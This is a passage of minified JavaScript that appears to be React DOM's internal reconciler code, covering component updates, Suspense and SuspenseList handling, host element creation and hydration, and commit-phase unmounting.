        i = t.stateNode, Cd(e, t), s = t.memoizedProps, u = t.type === t.elementType ? s : Fe(t.type, s), i.props = u, m = t.pendingProps, p = i.context, "object" == typeof (a = n.contextType) && null !== a ? a = Le(a) : a = On(t, a = we(n) ? Zt : ce.current);
        var g = n.getDerivedStateFromProps;
        (d = "function" == typeof g || "function" == typeof i.getSnapshotBeforeUpdate) || "function" != typeof i.UNSAFE_componentWillReceiveProps && "function" != typeof i.componentWillReceiveProps || (s !== m || p !== a) && Ea(t, i, r, a), St = !1, p = t.memoizedState, i.state = p, cl(t, r, i, o);
        var w = t.memoizedState;
        s !== m || p !== w || ye.current || St ? ("function" == typeof g && (os(t, n, g, r), w = t.memoizedState), (u = St || Ca(t, n, u, r, p, w, a) || !1) ? (d || "function" != typeof i.UNSAFE_componentWillUpdate && "function" != typeof i.componentWillUpdate || ("function" == typeof i.componentWillUpdate && i.componentWillUpdate(r, w, a), "function" == typeof i.UNSAFE_componentWillUpdate && i.UNSAFE_componentWillUpdate(r, w, a)), "function" == typeof i.componentDidUpdate && (t.flags |= 4), "function" == typeof i.getSnapshotBeforeUpdate && (t.flags |= 1024)) : ("function" != typeof i.componentDidUpdate || s === e.memoizedProps && p === e.memoizedState || (t.flags |= 4), "function" != typeof i.getSnapshotBeforeUpdate || s === e.memoizedProps && p === e.memoizedState || (t.flags |= 1024), t.memoizedProps = r, t.memoizedState = w), i.props = r, i.state = w, i.context = a, r = u) : ("function" != typeof i.componentDidUpdate || s === e.memoizedProps && p === e.memoizedState || (t.flags |= 4), "function" != typeof i.getSnapshotBeforeUpdate || s === e.memoizedProps && p === e.memoizedState || (t.flags |= 1024), r = !1);
    }
    return us(e, t, n, r, l, o);
}
function us(e, t, n, r, o, l) {
    Xd(e, t);
    var i = !!(128 & t.flags);
    if (!r && !i) return o && va(t, n, !1), pt(e, t, l);
    r = t.stateNode, Mh.current = t;
    var s = i && "function" != typeof n.getDerivedStateFromError ? null : r.render();
    return t.flags |= 1, null !== e && i ? (t.child = Ln(t, e.child, null, l), t.child = Ln(t, null, s, l)) : fe(e, t, s, l), t.memoizedState = r.state, o && va(t, n, !0), t.child;
}
function Jd(e) {
    var t = e.stateNode;
    t.pendingContext ? ha(e, t.pendingContext, t.pendingContext !== t.context) : t.context && ha(e, t.context, !1), su(e, t.containerInfo);
}
function Ra(e, t, n, r, o) {
    return Mn(), tu(o), t.flags |= 256, fe(e, t, n, r), t.child;
}
var ef,
    ds,
    tf,
    nf,
    as = {
        dehydrated: null,
        treeContext: null,
        retryLane: 0
    };
function cs(e) {
    return {
        baseLanes: e,
        cachePool: null,
        transitions: null
    };
}
function Zd(e, t, n) {
    var s,
        r = t.pendingProps,
        o = K.current,
        l = !1,
        i = !!(128 & t.flags);
    if ((s = i) || (s = (null === e || null !== e.memoizedState) && !!(2 & o)), s ? (l = !0, t.flags &= -129) : (null === e || null !== e.memoizedState) && (o |= 1), U(K, 1 & o), null === e) return ns(t), null !== (e = t.memoizedState) && null !== (e = e.dehydrated) ? (1 & t.mode ? "$!" === e.data ? t.lanes = 8 : t.lanes = 1073741824 : t.lanes = 1, null) : (i = r.children, e = r.fallback, l ? (r = t.mode, l = t.child, i = {
        mode: "hidden",
        children: i
    }, 1 & r || null === l ? l = Al(i, r, 0, null) : (l.childLanes = 0, l.pendingProps = i), e = Jt(e, r, n, null), l.return = t, e.return = t, l.sibling = e, t.child = l, t.child.memoizedState = cs(n), t.memoizedState = as, e) : hu(t, i));
    if (null !== (o = e.memoizedState) && null !== (s = o.dehydrated)) return Lh(e, t, i, r, s, o, n);
    if (l) {
        l = r.fallback, i = t.mode, s = (o = e.child).sibling;
        var a = {
            mode: "hidden",
            children: r.children
        };
        return 1 & i || t.child === o ? (r = Mt(o, a)).subtreeFlags = 14680064 & o.subtreeFlags : ((r = t.child).childLanes = 0, r.pendingProps = a, t.deletions = null), null !== s ? l = Mt(s, l) : (l = Jt(l, i, n, null)).flags |= 2, l.return = t, r.return = t, r.sibling = l, t.child = r, r = l, l = t.child, i = null === (i = e.child.memoizedState) ? cs(n) : {
            baseLanes: i.baseLanes | n,
            cachePool: null,
            transitions: i.transitions
        }, l.memoizedState = i, l.childLanes = e.childLanes & ~n, t.memoizedState = as, r;
    }
    return e = (l = e.child).sibling, r = Mt(l, {
        mode: "visible",
        children: r.children
    }), !(1 & t.mode) && (r.lanes = n), r.return = t, r.sibling = null, null !== e && (null === (n = t.deletions) ? (t.deletions = [e], t.flags |= 16) : n.push(e)), t.child = r, t.memoizedState = null, r;
}
function hu(e, t) {
    return (t = Al({
        mode: "visible",
        children: t
    }, e.mode, 0, null)).return = e, e.child = t;
}
function xo(e, t, n, r) {
    return null !== r && tu(r), Ln(t, e.child, null, n), (e = hu(t, t.pendingProps.children)).flags |= 2, t.memoizedState = null, e;
}
function Lh(e, t, n, r, o, l, i) {
    if (n) return 256 & t.flags ? (t.flags &= -257, xo(e, t, i, r = yi(Error(_(422))))) : null !== t.memoizedState ? (t.child = e.child, t.flags |= 128, null) : (l = r.fallback, o = t.mode, r = Al({
        mode: "visible",
        children: r.children
    }, o, 0, null), (l = Jt(l, o, i, null)).flags |= 2, r.return = t, l.return = t, r.sibling = l, t.child = r, 1 & t.mode && Ln(t, e.child, null, i), t.child.memoizedState = cs(i), t.memoizedState = as, l);
    if (!(1 & t.mode)) return xo(e, t, i, null);
    if ("$!" === o.data) {
        if (r = o.nextSibling && o.nextSibling.dataset) var s = r.dgst;
        return r = s, xo(e, t, i, r = yi(l = Error(_(419)), r, void 0));
    }
    if (s = !!(i & e.childLanes), ge || s) {
        if (null !== (r = ne)) {
            switch (i & -i) {
                case 4:
                    o = 2;
                    break;
                case 16:
                    o = 8;
                    break;
                case 64:
                case 128:
                case 256:
                case 512:
                case 1024:
                case 2048:
                case 4096:
                case 8192:
                case 16384:
                case 32768:
                case 65536:
                case 131072:
                case 262144:
                case 524288:
                case 1048576:
                case 2097152:
                case 4194304:
                case 8388608:
                case 16777216:
                case 33554432:
                case 67108864:
                    o = 32;
                    break;
                case 536870912:
                    o = 268435456;
                    break;
                default:
                    o = 0;
            }
            0 !== (o = o & (r.suspendedLanes | i) ? 0 : o) && o !== l.retryLane && (l.retryLane = o, ft(e, o), We(r, e, o, -1));
        }
        return Su(), xo(e, t, i, r = yi(Error(_(421))));
    }
    return "$?" === o.data ? (t.flags |= 128, t.child = e.child, t = Qh.bind(null, e), o._reactRetry = t, null) : (e = l.treeContext, _e = It(o.nextSibling), Ee = t, B = !0, Ue = null, null !== e && (ze[Re++] = it, ze[Re++] = st, ze[Re++] = qt, it = e.id, st = e.overflow, qt = t), (t = hu(t, r.children)).flags |= 4096, t);
}
function Oa(e, t, n) {
    e.lanes |= t;
    var r = e.alternate;
    null !== r && (r.lanes |= t), rs(e.return, t, n);
}
function wi(e, t, n, r, o) {
    var l = e.memoizedState;
    null === l ? e.memoizedState = {
        isBackwards: t,
        rendering: null,
        renderingStartTime: 0,
        last: r,
        tail: n,
        tailMode: o
    } : (l.isBackwards = t, l.rendering = null, l.renderingStartTime = 0, l.last = r, l.tail = n, l.tailMode = o);
}
function qd(e, t, n) {
    var r = t.pendingProps,
        o = r.revealOrder,
        l = r.tail;
    if (fe(e, t, r.children, n), 2 & (r = K.current)) r = 1 & r | 2, t.flags |= 128; else {
        if (null !== e && 128 & e.flags) e: for (e = t.child; null !== e;) {
            if (13 === e.tag) null !== e.memoizedState && Oa(e, n, t); else if (19 === e.tag) Oa(e, n, t); else if (null !== e.child) {
                e.child.return = e, e = e.child;
                continue;
            }
            if (e === t) break e;
            for (; null === e.sibling;) {
                if (null === e.return || e.return === t) break e;
                e = e.return;
            }
            e.sibling.return = e.return, e = e.sibling;
        }
        r &= 1;
    }
    if (U(K, r), 1 & t.mode) switch (o) {
        case "forwards":
            for (n = t.child, o = null; null !== n;) null !== (e = n.alternate) && null === dl(e) && (o = n), n = n.sibling;
            null === (n = o) ? (o = t.child, t.child = null) : (o = n.sibling, n.sibling = null), wi(t, !1, o, n, l);
            break;
        case "backwards":
            for (n = null, o = t.child, t.child = null; null !== o;) {
                if (null !== (e = o.alternate) && null === dl(e)) {
                    t.child = o;
                    break;
                }
                e = o.sibling, o.sibling = n, n = o, o = e;
            }
            wi(t, !0, n, null, l);
            break;
        case "together":
            wi(t, !1, null, null, void 0);
            break;
        default:
            t.memoizedState = null;
    } else t.memoizedState = null;
    return t.child;
}
function bo(e, t) {
    !(1 & t.mode) && null !== e && (e.alternate = null, t.alternate = null, t.flags |= 2);
}
function pt(e, t, n) {
    if (null !== e && (t.dependencies = e.dependencies), tn |= t.lanes, !(n & t.childLanes)) return null;
    if (null !== e && t.child !== e.child) throw Error(_(153));
    if (null !== t.child) {
        for (n = Mt(e = t.child, e.pendingProps), t.child = n, n.return = t; null !== e.sibling;) e = e.sibling, (n = n.sibling = Mt(e, e.pendingProps)).return = t;
        n.sibling = null;
    }
    return t.child;
}
function Ah(e, t, n) {
    switch (t.tag) {
        case 3:
            Jd(t), Mn();
            break;
        case 5:
            Ed(t);
            break;
        case 1:
            we(t.type) && ll(t);
            break;
        case 4:
            su(t, t.stateNode.containerInfo);
            break;
        case 10:
            var r = t.type._context,
                o = t.memoizedProps.value;
            U(ul, r._currentValue), r._currentValue = o;
            break;
        case 13:
            if (null !== (r = t.memoizedState)) return null !== r.dehydrated ? (U(K, 1 & K.current), t.flags |= 128, null) : n & t.child.childLanes ? Zd(e, t, n) : (U(K, 1 & K.current), null !== (e = pt(e, t, n)) ? e.sibling : null);
            U(K, 1 & K.current);
            break;
        case 19:
            if (r = !!(n & t.childLanes), 128 & e.flags) {
                if (r) return qd(e, t, n);
                t.flags |= 128;
            }
            if (null !== (o = t.memoizedState) && (o.rendering = null, o.tail = null, o.lastEffect = null), U(K, K.current), r) break;
            return null;
        case 22:
        case 23:
            return t.lanes = 0, Yd(e, t, n);
    }
    return pt(e, t, n);
}
function lr(e, t) {
    if (!B) switch (e.tailMode) {
        case "hidden":
            t = e.tail;
            for (var n = null; null !== t;) null !== t.alternate && (n = t), t = t.sibling;
            null === n ? e.tail = null : n.sibling = null;
            break;
        case "collapsed":
            n = e.tail;
            for (var r = null; null !== n;) null !== n.alternate && (r = n), n = n.sibling;
            null === r ? t || null === e.tail ? e.tail = null : e.tail.sibling = null : r.sibling = null;
    }
}
function ue(e) {
    var t = null !== e.alternate && e.alternate.child === e.child,
        n = 0,
        r = 0;
    if (t) for (var o = e.child; null !== o;) n |= o.lanes | o.childLanes, r |= 14680064 & o.subtreeFlags, r |= 14680064 & o.flags, o.return = e, o = o.sibling; else for (o = e.child; null !== o;) n |= o.lanes | o.childLanes, r |= o.subtreeFlags, r |= o.flags, o.return = e, o = o.sibling;
    return e.subtreeFlags |= r, e.childLanes = n, t;
}
function $h(e, t, n) {
    var r = t.pendingProps;
    switch (eu(t), t.tag) {
        case 2:
        case 16:
        case 15:
        case 0:
        case 11:
        case 7:
        case 8:
        case 12:
        case 9:
        case 14:
            return ue(t), null;
        case 1:
        case 17:
            return we(t.type) && ol(), ue(t), null;
        case 3:
            return r = t.stateNode, An(), W(ye), W(ce), au(), r.pendingContext && (r.context = r.pendingContext, r.pendingContext = null), (null === e || null === e.child) && (yo(t) ? t.flags |= 4 : null === e || e.memoizedState.isDehydrated && !(256 & t.flags) || (t.flags |= 1024, null !== Ue && (ws(Ue), Ue = null))), ds(e, t), ue(t), null;
        case 5:
            uu(t);
            var o = Qt(Mr.current);
            if (n = t.type, null !== e && null != t.stateNode) tf(e, t, n, r, o), e.ref !== t.ref && (t.flags |= 512, t.flags |= 2097152); else {
                if (!r) {
                    if (null === t.stateNode) throw Error(_(166));
                    return ue(t), null;
                }
                if (e = Qt(et.current), yo(t)) {
                    r = t.stateNode, n = t.type;
                    var l = t.memoizedProps;
                    switch (r[Ze] = t, r[Rr] = l, e = !!(1 & t.mode), n) {
                        case "dialog":
                            V("cancel", r), V("close", r);
                            break;
                        case "iframe":
                        case "object":
                        case "embed":
                            V("load", r);
                            break;
                        case "video":
                        case "audio":
                            for (o = 0; o < fr.length; o++) V(fr[o], r);
                            break;
                        case "source":
                            V("error", r);
                            break;
                        case "img":
                        case "image":
                        case "link":
                            V("error", r), V("load", r);
                            break;
                        case "details":
                            V("toggle", r);
                            break;
                        case "input":
                            Vu(r, l), V("invalid", r);
                            break;
                        case "select":
                            r._wrapperState = {
                                wasMultiple: !!l.multiple
                            }, V("invalid", r);
                            break;
                        case "textarea":
                            Bu(r, l), V("invalid", r);
                    }
                    for (var i in Fi(n, l), o = null, l) if (l.hasOwnProperty(i)) {
                        var s = l[i];
                        "children" === i ? "string" == typeof s ? r.textContent !== s && (!0 !== l.suppressHydrationWarning && go(r.textContent, s, e), o = ["children", s]) : "number" == typeof s && r.textContent !== "" + s && (!0 !== l.suppressHydrationWarning && go(r.textContent, s, e), o = ["children", "" + s]) : kr.hasOwnProperty(i) && null != s && "onScroll" === i && V("scroll", r);
                    }
                    switch (n) {
                        case "input":
                            uo(r), Wu(r, l, !0);
                            break;
                        case "textarea":
                            uo(r), Hu(r);
                            break;
                        case "select":
                        case "option":
                            break;
                        default:
                            "function" == typeof l.onClick && (r.onclick = rl);
                    }
                    r = o, t.updateQueue = r, null !== r && (t.flags |= 4);
                } else {
                    i = 9 === o.nodeType ? o : o.ownerDocument, "http://www.w3.org/1999/xhtml" === e && (e = Ic(n)), "http://www.w3.org/1999/xhtml" === e ? "script" === n ? ((e = i.createElement("div")).innerHTML = "<script><\/script>", e = e.removeChild(e.firstChild)) : "string" == typeof r.is ? e = i.createElement(n, {
                        is: r.is
                    }) : (e = i.createElement(n), "select" === n && (i = e, r.multiple ? i.multiple = !0 : r.size && (i.size = r.size))) : e = i.createElementNS(e, n), e[Ze] = t, e[Rr] = r, ef(e, t, !1, !1), t.stateNode = e;
                    e: {
                        switch (i = Di(n, r), n) {
                            case "dialog":
                                V("cancel", e), V("close", e), o = r;
                                break;
                            case "iframe":
                            case "object":
                            case "embed":
                                V("load", e), o = r;
                                break;
                            case "video":
                            case "audio":
                                for (o = 0; o < fr.length; o++) V(fr[o], e);
                                o = r;
                                break;
                            case "source":
                                V("error", e), o = r;
                                break;
                            case "img":
                            case "image":
                            case "link":
                                V("error", e), V("load", e), o = r;
                                break;
                            case "details":
                                V("toggle", e), o = r;
                                break;
                            case "input":
                                Vu(e, r), o = Oi(e, r), V("invalid", e);
                                break;
                            case "option":
                            default:
                                o = r;
                                break;
                            case "select":
                                e._wrapperState = {
                                    wasMultiple: !!r.multiple
                                }, o = Q({}, r, {
                                    value: void 0
                                }), V("invalid", e);
                                break;
                            case "textarea":
                                Bu(e, r), o = Ai(e, r), V("invalid", e);
                        }
                        for (l in Fi(n, o), s = o) if (s.hasOwnProperty(l)) {
                            var a = s[l];
                            "style" === l ? Oc(e, a) : "dangerouslySetInnerHTML" === l ? null != (a = a ? a.__html : void 0) && zc(e, a) : "children" === l ? "string" == typeof a ? ("textarea" !== n || "" !== a) && _r(e, a) : "number" == typeof a && _r(e, "" + a) : "suppressContentEditableWarning" !== l && "suppressHydrationWarning" !== l && "autoFocus" !== l && (kr.hasOwnProperty(l) ? null != a && "onScroll" === l && V("scroll", e) : null != a && Ds(e, l, a, i));
                        }
                        switch (n) {
                            case "input":
                                uo(e), Wu(e, r, !1);
                                break;
                            case "textarea":
                                uo(e), Hu(e);
                                break;
                            case "option":
                                null != r.value && e.setAttribute("value", "" + Lt(r.value));
                                break;
                            case "select":
                                e.multiple = !!r.multiple, null != (l = r.value) ? Nn(e, !!r.multiple, l, !1) : null != r.defaultValue && Nn(e, !!r.multiple, r.defaultValue, !0);
                                break;
                            default:
                                "function" == typeof o.onClick && (e.onclick = rl);
                        }
                        switch (n) {
                            case "button":
                            case "input":
                            case "select":
                            case "textarea":
                                r = !!r.autoFocus;
                                break e;
                            case "img":
                                r = !0;
                                break e;
                            default:
                                r = !1;
                        }
                    }
                    r && (t.flags |= 4);
                }
                null !== t.ref && (t.flags |= 512, t.flags |= 2097152);
            }
            return ue(t), null;
        case 6:
            if (e && null != t.stateNode) nf(e, t, e.memoizedProps, r); else {
                if ("string" != typeof r && null === t.stateNode) throw Error(_(166));
                if (n = Qt(Mr.current), Qt(et.current), yo(t)) {
                    if (r = t.stateNode, n = t.memoizedProps, r[Ze] = t, (l = r.nodeValue !== n) && null !== (e = Ee)) switch (e.tag) {
                        case 3:
                            go(r.nodeValue, n, !!(1 & e.mode));
                            break;
                        case 5:
                            !0 !== e.memoizedProps.suppressHydrationWarning && go(r.nodeValue, n, !!(1 & e.mode));
                    }
                    l && (t.flags |= 4);
                } else (r = (9 === n.nodeType ? n : n.ownerDocument).createTextNode(r))[Ze] = t, t.stateNode = r;
            }
            return ue(t), null;
        case 13:
            if (W(K), r = t.memoizedState, null === e || null !== e.memoizedState && null !== e.memoizedState.dehydrated) {
                if (B && null !== _e && 1 & t.mode && !(128 & t.flags)) xd(), Mn(), t.flags |= 98560, l = !1; else if (l = yo(t), null !== r && null !== r.dehydrated) {
                    if (null === e) {
                        if (!l) throw Error(_(318));
                        if (!(l = null !== (l = t.memoizedState) ? l.dehydrated : null)) throw Error(_(317));
                        l[Ze] = t;
                    } else Mn(), !(128 & t.flags) && (t.memoizedState = null), t.flags |= 4;
                    ue(t), l = !1;
                } else null !== Ue && (ws(Ue), Ue = null), l = !0;
                if (!l) return 65536 & t.flags ? t : null;
            }
            return 128 & t.flags ? (t.lanes = n, t) : ((r = null !== r) !== (null !== e && null !== e.memoizedState) && r && (t.child.flags |= 8192, 1 & t.mode && (null === e || 1 & K.current ? 0 === ee && (ee = 3) : Su())), null !== t.updateQueue && (t.flags |= 4), ue(t), null);
        case 4:
            return An(), ds(e, t), null === e && Ir(t.stateNode.containerInfo), ue(t), null;
        case 10:
            return ou(t.type._context), ue(t), null;
        case 19:
            if (W(K), null === (l = t.memoizedState)) return ue(t), null;
            if (r = !!(128 & t.flags), null === (i = l.rendering)) {
                if (r) lr(l, !1); else {
                    if (0 !== ee || null !== e && 128 & e.flags) for (e = t.child; null !== e;) {
                        if (null !== (i = dl(e))) {
                            for (t.flags |= 128, lr(l, !1), null !== (r = i.updateQueue) && (t.updateQueue = r, t.flags |= 4), t.subtreeFlags = 0, r = n, n = t.child; null !== n;) e = r, (l = n).flags &= 14680066, null === (i = l.alternate) ? (l.childLanes = 0, l.lanes = e, l.child = null, l.subtreeFlags = 0, l.memoizedProps = null, l.memoizedState = null, l.updateQueue = null, l.dependencies = null, l.stateNode = null) : (l.childLanes = i.childLanes, l.lanes = i.lanes, l.child = i.child, l.subtreeFlags = 0, l.deletions = null, l.memoizedProps = i.memoizedProps, l.memoizedState = i.memoizedState, l.updateQueue = i.updateQueue, l.type = i.type, e = i.dependencies, l.dependencies = null === e ? null : {
                                lanes: e.lanes,
                                firstContext: e.firstContext
                            }), n = n.sibling;
                            return U(K, 1 & K.current | 2), t.child;
                        }
                        e = e.sibling;
                    }
                    null !== l.tail && X() > Fn && (t.flags |= 128, r = !0, lr(l, !1), t.lanes = 4194304);
                }
            } else {
                if (!r) if (null !== (e = dl(i))) {
                    if (t.flags |= 128, r = !0, null !== (n = e.updateQueue) && (t.updateQueue = n, t.flags |= 4), lr(l, !0), null === l.tail && "hidden" === l.tailMode && !i.alternate && !B) return ue(t), null;
                } else 2 * X() - l.renderingStartTime > Fn && 1073741824 !== n && (t.flags |= 128, r = !0, lr(l, !1), t.lanes = 4194304);
                l.isBackwards ? (i.sibling = t.child, t.child = i) : (null !== (n = l.last) ? n.sibling = i : t.child = i, l.last = i);
            }
            return null !== l.tail ? (t = l.tail, l.rendering = t, l.tail = t.sibling, l.renderingStartTime = X(), t.sibling = null, n = K.current, U(K, r ? 1 & n | 2 : 1 & n), t) : (ue(t), null);
        case 22:
        case 23:
            return xu(), r = null !== t.memoizedState, null !== e && null !== e.memoizedState !== r && (t.flags |= 8192), r && 1 & t.mode ? 1073741824 & ke && (ue(t), 6 & t.subtreeFlags && (t.flags |= 8192)) : ue(t), null;
        case 24:
        case 25:
            return null;
    }
    throw Error(_(156, t.tag));
}
function Fh(e, t) {
    switch (eu(t), t.tag) {
        case 1:
            return we(t.type) && ol(), 65536 & (e = t.flags) ? (t.flags = -65537 & e | 128, t) : null;
        case 3:
            return An(), W(ye), W(ce), au(), 65536 & (e = t.flags) && !(128 & e) ? (t.flags = -65537 & e | 128, t) : null;
        case 5:
            return uu(t), null;
        case 13:
            if (W(K), null !== (e = t.memoizedState) && null !== e.dehydrated) {
                if (null === t.alternate) throw Error(_(340));
                Mn();
            }
            return 65536 & (e = t.flags) ? (t.flags = -65537 & e | 128, t) : null;
        case 19:
            return W(K), null;
        case 4:
            return An(), null;
        case 10:
            return ou(t.type._context), null;
        case 22:
        case 23:
            return xu(), null;
        default:
            return null;
    }
}
ef = function (e, t) {
    for (var n = t.child; null !== n;) {
        if (5 === n.tag || 6 === n.tag) e.appendChild(n.stateNode); else if (4 !== n.tag && null !== n.child) {
            n.child.return = n, n = n.child;
            continue;
        }
        if (n === t) break;
        for (; null === n.sibling;) {
            if (null === n.return || n.return === t) return;
            n = n.return;
        }
        n.sibling.return = n.return, n = n.sibling;
    }
}, ds = function () { }, tf = function (e, t, n, r) {
    var o = e.memoizedProps;
    if (o !== r) {
        e = t.stateNode, Qt(et.current);
        var i,
            l = null;
        switch (n) {
            case "input":
                o = Oi(e, o), r = Oi(e, r), l = [];
                break;
            case "select":
                o = Q({}, o, {
                    value: void 0
                }), r = Q({}, r, {
                    value: void 0
                }), l = [];
                break;
            case "textarea":
                o = Ai(e, o), r = Ai(e, r), l = [];
                break;
            default:
                "function" != typeof o.onClick && "function" == typeof r.onClick && (e.onclick = rl);
        }
        for (u in Fi(n, r), n = null, o) if (!r.hasOwnProperty(u) && o.hasOwnProperty(u) && null != o[u]) if ("style" === u) {
            var s = o[u];
            for (i in s) s.hasOwnProperty(i) && (n || (n = {}), n[i] = "");
        } else "dangerouslySetInnerHTML" !== u && "children" !== u && "suppressContentEditableWarning" !== u && "suppressHydrationWarning" !== u && "autoFocus" !== u && (kr.hasOwnProperty(u) ? l || (l = []) : (l = l || []).push(u, null));
        for (u in r) {
            var a = r[u];
            if (s = null != o ? o[u] : void 0, r.hasOwnProperty(u) && a !== s && (null != a || null != s)) if ("style" === u) {
                if (s) {
                    for (i in s) !s.hasOwnProperty(i) || a && a.hasOwnProperty(i) || (n || (n = {}), n[i] = "");
                    for (i in a) a.hasOwnProperty(i) && s[i] !== a[i] && (n || (n = {}), n[i] = a[i]);
                } else n || (l || (l = []), l.push(u, n)), n = a;
            } else "dangerouslySetInnerHTML" === u ? (a = a ? a.__html : void 0, s = s ? s.__html : void 0, null != a && s !== a && (l = l || []).push(u, a)) : "children" === u ? "string" != typeof a && "number" != typeof a || (l = l || []).push(u, "" + a) : "suppressContentEditableWarning" !== u && "suppressHydrationWarning" !== u && (kr.hasOwnProperty(u) ? (null != a && "onScroll" === u && V("scroll", e), l || s === a || (l = [])) : (l = l || []).push(u, a));
        }
        n && (l = l || []).push("style", n);
        var u = l;
        (t.updateQueue = u) && (t.flags |= 4);
    }
}, nf = function (e, t, n, r) {
    n !== r && (t.flags |= 4);
};
var So = !1,
    ae = !1,
    Dh = "function" == typeof WeakSet ? WeakSet : Set,
    P = null;
function Cn(e, t) {
    var n = e.ref;
    if (null !== n) if ("function" == typeof n) try {
        n(null);
    } catch (r) {
        Y(e, t, r);
    } else n.current = null;
}
function fs(e, t, n) {
    try {
        n();
    } catch (r) {
        Y(e, t, r);
    }
}
var Ma = !1;
function Uh(e, t) {
    if (Yi = el, Zs(e = sd())) {
        if ("selectionStart" in e) var n = {
            start: e.selectionStart,
            end: e.selectionEnd
        }; else e: {
            var r = (n = (n = e.ownerDocument) && n.defaultView || window).getSelection && n.getSelection();
            if (r && 0 !== r.rangeCount) {
                n = r.anchorNode;
                var o = r.anchorOffset,
                    l = r.focusNode;
                r = r.focusOffset;
                try {
                    n.nodeType, l.nodeType;
                } catch {
                    n = null;
                    break e;
                }
                var i = 0,
                    s = -1,
                    a = -1,
                    u = 0,
                    d = 0,
                    m = e,
                    p = null;
                t: for (; ;) {
                    for (var g; m !== n || 0 !== o && 3 !== m.nodeType || (s = i + o), m !== l || 0 !== r && 3 !== m.nodeType || (a = i + r), 3 === m.nodeType && (i += m.nodeValue.length), null !== (g = m.firstChild);) p = m, m = g;
                    for (; ;) {
                        if (m === e) break t;
                        if (p === n && ++u === o && (s = i), p === l && ++d === r && (a = i), null !== (g = m.nextSibling)) break;
                        p = (m = p).parentNode;
                    }
                    m = g;
                }
                n = -1 === s || -1 === a ? null : {
                    start: s,
                    end: a
                };
            } else n = null;
        }
        n = n || {
            start: 0,
            end: 0
        };
    } else n = null;
    for (Xi = {
        focusedElem: e,
        selectionRange: n
    }, el = !1, P = t; null !== P;) if (e = (t = P).child, 1028 & t.subtreeFlags && null !== e) e.return = t, P = e; else for (; null !== P;) {
        t = P;
        try {
            var w = t.alternate;
            if (1024 & t.flags) switch (t.tag) {
                case 0:
                case 11:
                case 15:
                case 5:
                case 6:
                case 4:
                case 17:
                    break;
                case 1:
                    if (null !== w) {
                        var y = w.memoizedProps,
                            S = w.memoizedState,
                            f = t.stateNode,
                            c = f.getSnapshotBeforeUpdate(t.elementType === t.type ? y : Fe(t.type, y), S);
                        f.__reactInternalSnapshotBeforeUpdate = c;
                    }
                    break;
                case 3:
                    var h = t.stateNode.containerInfo;
                    1 === h.nodeType ? h.textContent = "" : 9 === h.nodeType && h.documentElement && h.removeChild(h.documentElement);
                    break;
                default:
                    throw Error(_(163));
            }
        } catch (k) {
            Y(t, t.return, k);
        }
        if (null !== (e = t.sibling)) {
            e.return = t.return, P = e;
            break;
        }
        P = t.return;
    }
    return w = Ma, Ma = !1, w;
}
function wr(e, t, n) {
    var r = t.updateQueue;
    if (null !== (r = null !== r ? r.lastEffect : null)) {
        var o = r = r.next;
        do {
            if ((o.tag & e) === e) {
                var l = o.destroy;
                o.destroy = void 0, void 0 !== l && fs(t, n, l);
            }
            o = o.next;
        } while (o !== r);
    }
}
function Ml(e, t) {
    if (null !== (t = null !== (t = t.updateQueue) ? t.lastEffect : null)) {
        var n = t = t.next;
        do {
            if ((n.tag & e) === e) {
                var r = n.create;
                n.destroy = r();
            }
            n = n.next;
        } while (n !== t);
    }
}
function ps(e) {
    var t = e.ref;
    if (null !== t) {
        var n = e.stateNode;
        e.tag, e = n, "function" == typeof t ? t(e) : t.current = e;
    }
}
function rf(e) {
    var t = e.alternate;
    null !== t && (e.alternate = null, rf(t)), e.child = null, e.deletions = null, e.sibling = null, 5 === e.tag && null !== (t = e.stateNode) && (delete t[Ze], delete t[Rr], delete t[qi], delete t[kh], delete t[_h]), e.stateNode = null, e.return = null, e.dependencies = null, e.memoizedProps = null, e.memoizedState = null, e.pendingProps = null, e.stateNode = null, e.updateQueue = null;
}
function of(e) {
    return 5 === e.tag || 3 === e.tag || 4 === e.tag;
}
function La(e) {
    e: for (; ;) {
        for (; null === e.sibling;) {
            if (null === e.return || of(e.return)) return null;
            e = e.return;
        }
        for (e.sibling.return = e.return, e = e.sibling; 5 !== e.tag && 6 !== e.tag && 18 !== e.tag;) {
            if (2 & e.flags || null === e.child || 4 === e.tag) continue e;
            e.child.return = e, e = e.child;
        }
        if (!(2 & e.flags)) return e.stateNode;
    }
}
function ms(e, t, n) {
    var r = e.tag;
    if (5 === r || 6 === r) e = e.stateNode, t ? 8 === n.nodeType ? n.parentNode.insertBefore(e, t) : n.insertBefore(e, t) : (8 === n.nodeType ? (t = n.parentNode).insertBefore(e, n) : (t = n).appendChild(e), null != (n = n._reactRootContainer) || null !== t.onclick || (t.onclick = rl)); else if (4 !== r && null !== (e = e.child)) for (ms(e, t, n), e = e.sibling; null !== e;) ms(e, t, n), e = e.sibling;
}
function hs(e, t, n) {
    var r = e.tag;
    if (5 === r || 6 === r) e = e.stateNode, t ? n.insertBefore(e, t) : n.appendChild(e); else if (4 !== r && null !== (e = e.child)) for (hs(e, t, n), e = e.sibling; null !== e;) hs(e, t, n), e = e.sibling;
}
var re = null,
    De = !1;
function gt(e, t, n) {
    for (n = n.child; null !== n;) lf(e, t, n), n = n.sibling;
}
function lf(e, t, n) {
    if (qe && "function" == typeof qe.onCommitFiberUnmount) try {
        qe.onCommitFiberUnmount(Nl, n);
    } catch { }
    switch (n.tag) {
        case 5:
            ae || Cn(n, t);
        case 6:
            var r = re,
                o = De;
            re = null, gt(e, t, n), De = o, null !== (re = r) && (De ? (e = re, n = n.stateNode, 8 === e.nodeType ? e.parentNode.removeChild(n) : e.removeChild(n)) : re.removeChild(n.stateNode));
            break;
        case 18:
            null !== re && (De ? (e = re, n = n.stateNode, 8 === e.nodeType ? fi(e.parentNode, n) : 1 === e.nodeType && fi(e, n), Pr(e)) : fi(re, n.stateNode));
            break;
        case 4:
            r = re, o = De, re = n.stateNode.containerInfo, De = !0, gt(e, t, n), re = r, De = o;
            break;
        case 0:
        case 11:
        case 14:
        case 15:
            if (!ae && null !== (r = n.updateQueue) && null !== (r = r.lastEffect)) {
                o = r = r.next;
                do {
                    var l = o,
                        i = l.destroy;
                    l = l.tag, void 0 !== i && (2 & l || 4 & l) && fs(n, t, i), o = o.next;
                } while (o !== r);
            }
            gt(e, t, n);
            break;
        case 1:
            if (!ae && (Cn(n, t), "function" == typeof (r = n.stateNode).componentWillUnmount)) try {
                r.props = n.memoizedProps, r.state = n.memoizedState, r.componentWillUnmount();
            } catch (s) {
                Y(n, t, s);
            }
            gt(e, t, n);
            break;
        case 21:
            gt(e, t, n);
            break;
        case 22:
